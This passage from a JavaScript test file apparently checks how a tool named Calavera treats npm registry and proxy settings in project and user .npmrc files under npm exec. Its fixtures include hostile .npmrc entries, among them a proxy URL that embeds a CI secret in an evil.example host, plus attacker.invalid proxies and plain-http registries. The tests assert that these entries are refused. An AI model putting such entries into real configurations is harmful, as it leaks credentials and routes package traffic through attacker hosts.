    assert.equal(result.options.httpsProxy, undefined, projectKey);
    assert.equal(result.options.proxy, undefined, projectKey);
    assert.match(result.warnings.join("\n"), /in the project \.npmrc/, projectKey);
    assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
  }
});

test("under npm exec, a project registry key whose variable npm expanded differently follows the project rules", async () => {
  const context = await fixture({ project: "registry${INIT_CWD?}=http://evil.example/\n" });
  await assert.rejects(
    loadNpmRegistryOptions(
      npmExecContext(context, {
        INIT_CWD: context.cwd,
        npm_config_registry: "http://evil.example/",
      }),
    ),
    /in the project \.npmrc must be an https URL/,
  );
});

test("a real npm exec with a project proxy key that holds INIT_CWD does not carry the proxy into the options", async (t) => {
  const context = await fixture({
    project: "https-proxy${INIT_CWD?}=http://${CI_SECRET}.evil.example/\n",
  });
  await writeFile(join(context.cwd, "package.json"), JSON.stringify({ name: "probe" }));
  const home = join(context.directory, "home");
  await mkdir(home);
  const captured = await npmExecEnvironmentIn(t, context.cwd, home, { CI_SECRET: SECRET_PROXY });
  if (!captured) return;
  assert.equal(captured.npm_config_https_proxy, `http://${SECRET_PROXY}.evil.example/`);
  const result = await loadNpmRegistryOptions({
    ...context,
    env: { ...captured, INIT_CWD: context.cwd },
  });
  assert.equal(result.options.httpsProxy, undefined);
  assert.doesNotMatch(inspect(result, { depth: 10 }), new RegExp(SECRET_PROXY));
});

test("under npm exec, a chooser key whose variable npm expanded differently still chooses the global npmrc", async () => {
  const context = await globalConfigContext({
    project: "globalconfig${INIT_CWD?}=../elsewhere/g.npmrc\n",
    globalPath: "elsewhere/g.npmrc",
    content: "registry=http://insecure.example.com/\n",
    exported: { npm_config_registry: "http://insecure.example.com/" },
  });
  context.env.INIT_CWD = context.cwd;
  await assert.rejects(
    loadNpmRegistryOptions(context),
    /registry in the global npmrc must be an https URL/,
  );
});

test("under npm exec, your own ~/.npmrc is not a chooser even when the project .npmrc names a userconfig", async () => {
  // The caller's npm_config_userconfig wins over the project's userconfig in npm, and here it
  // names the account's own ~/.npmrc, which sets prefix as a ~/.npm-global setup does.
  const context = await globalConfigContext({
    project: "userconfig=./evil.npmrc\n",
    globalPath: "npm-global/etc/npmrc",
    content: "registry=http://mirror.example.com/\n",
    exported: { npm_config_registry: "http://mirror.example.com/" },
  });
  await writeFile(context.env.npm_config_userconfig, "prefix=../npm-global\n");
  assert.equal((await loadNpmRegistryOptions(context)).registry.source, "global npmrc");
});

test("under npm exec, a file entry that cannot be read as the key leaves the caller's proxy alone", async () => {
  /** @type {[string, string][]} */
  const cases = [
    // A project key with a variable that cannot stand for https-proxy.
    ["project", "unrelated${NOPE?}=${CI_SECRET}\n"],
    // A list and a boolean in your own ~/.npmrc, which Calavera does not read as a proxy.
    ["user", "https-proxy[]=http://list.example.com/\n"],
    ["user", "https-proxy=true\n"],
  ];
  for (const [file, content] of cases) {
    const context = await fixture(file === "project" ? { project: content } : { user: content });
    const { options } = await loadNpmRegistryOptions(
      npmExecContext(context, { npm_config_https_proxy: "http://caller.example.com:3128/" }),
    );
    assert.equal(options.httpsProxy, "http://caller.example.com:3128/", content);
  }
});

test("under npm exec, a variable in the middle of a project key may stand for the text between its parts", async () => {
  // npm expanded DASH to "-" when it loaded the file; Calavera's environment does not have it.
  const context = await fixture({ project: "https${DASH}proxy=http://evil.example/\n" });
  const { options, warnings } = await loadNpmRegistryOptions(
    npmExecContext(context, { npm_config_https_proxy: "http://evil.example/" }),
  );
  assert.equal(options.httpsProxy, undefined);
  assert.match(warnings.join("\n"), /^Ignored https\$\{DASH\}proxy in the project \.npmrc/m);
});

test("under npm exec, a key in your own ~/.npmrc is expanded, not read as a pattern", async () => {
  // The key expands to https-proxy-other, which is not https-proxy, so the caller's equal value
  // is not this file's.
  const context = await fixture({
    user: "https-proxy${SUFFIX}=http://caller.example.com:3128/\n",
  });
  const { options } = await loadNpmRegistryOptions(
    npmExecContext(context, {
      SUFFIX: "-other",
      npm_config_https_proxy: "http://caller.example.com:3128/",
    }),
  );
  assert.equal(options.httpsProxy, "http://caller.example.com:3128/");
});

// #1186, fifth review: npm honors only the exact key `userconfig`, but exports every spelling in
// lowercase, so a project `USERCONFIG=./evil.npmrc` replaces the caller's npm_config_userconfig
// although npm read the caller's file. Calavera cannot find the file npm read, so the user file it
// would read follows the project rules.

test("under npm exec, a project userconfig in another spelling makes the user .npmrc follow the project rules", async () => {
  for (const projectKey of ["USERCONFIG", "UserConfig", "userconfig${INIT_CWD?}"]) {
    const context = await fixture({ project: `${projectKey}=./evil.npmrc\n` });
    const chosen = join(context.cwd, "evil.npmrc");
    await writeFile(
      chosen,
      "https-proxy=http://attacker.invalid:1/\nregistry=http://insecure.invalid/\n",
    );
    await assert.rejects(
      loadNpmRegistryOptions(
        npmExecContext(context, {
          INIT_CWD: context.cwd,
          npm_config_userconfig: chosen,
          npm_config_https_proxy: "http://attacker.invalid:1/",
          npm_config_registry: "http://insecure.invalid/",
        }),
      ),
      /registry in the user \.npmrc that the project \.npmrc chose must be an https URL/,
      projectKey,
    );
    await writeFile(chosen, "https-proxy=http://attacker.invalid:1/\n");
    const { options, warnings } = await loadNpmRegistryOptions(
      npmExecContext(context, {
        INIT_CWD: context.cwd,
        npm_config_userconfig: chosen,
        npm_config_https_proxy: "http://attacker.invalid:1/",
      }),
    );
    assert.equal(options.httpsProxy, undefined, projectKey);
    assert.match(
      warnings.join("\n"),
      /^Ignored https-proxy in the user \.npmrc that the project \.npmrc chose/m,
      projectKey,
    );
  }
});

// Owner decision 1 on #1186 (2026-11-24): a user file that the project chose with `userconfig`
// follows the project rules; your own ~/.npmrc keeps user trust.

test("under npm exec, a user .npmrc that the project chose with userconfig follows the project rules", async () => {
  const context = await fixture({ project: "userconfig=./evil.npmrc\n" });
  const chosen = join(context.cwd, "evil.npmrc");
  await writeFile(chosen, "https-proxy=http://chosen.example.com:1/\n");
  const proxy = await loadNpmRegistryOptions(
    npmExecContext(context, {
      npm_config_userconfig: chosen,
      npm_config_https_proxy: "http://chosen.example.com:1/",
    }),
  );
  assert.equal(proxy.options.httpsProxy, undefined);
  assert.match(
    proxy.warnings.join("\n"),
    /^Ignored https-proxy in the user \.npmrc that the project \.npmrc chose: Calavera reads proxies only/m,
  );
  await writeFile(chosen, "registry=http://insecure.example.com/\n");
  await assert.rejects(
    loadNpmRegistryOptions(
      npmExecContext(context, {
        npm_config_userconfig: chosen,
        npm_config_registry: "http://insecure.example.com/",
      }),
    ),
    /registry in the user \.npmrc that the project \.npmrc chose must be an https URL/,
  );
});

test("under npm exec, your own ~/.npmrc keeps user trust when the project's userconfig names it", async () => {
  const context = await fixture({ user: "registry=http://mirror.example.com/\n" });
  await writeFile(join(context.cwd, ".npmrc"), `userconfig=${context.env.npm_config_userconfig}\n`);
  const { options } = await loadNpmRegistryOptions(
    npmExecContext(context, { npm_config_registry: "http://mirror.example.com/" }),
  );
  assert.equal(options.registry, "http://mirror.example.com/");
});

test("under npm exec, a user .npmrc the caller chose keeps user trust although the project names another", async () => {
  // npm lets the caller's npm_config_userconfig win over the project's userconfig, and passes it
  // on unchanged.
  const context = await fixture({ project: "userconfig=./evil.npmrc\n" });
  const ci = join(context.directory, "ci.npmrc");
  await writeFile(ci, "https-proxy=http://corp.example.com:3128/\n");
  const { options } = await loadNpmRegistryOptions(
    npmExecContext(context, {
      npm_config_userconfig: ci,
      npm_config_https_proxy: "http://corp.example.com:3128/",
    }),
  );
  assert.equal(options.httpsProxy, "http://corp.example.com:3128/");
});
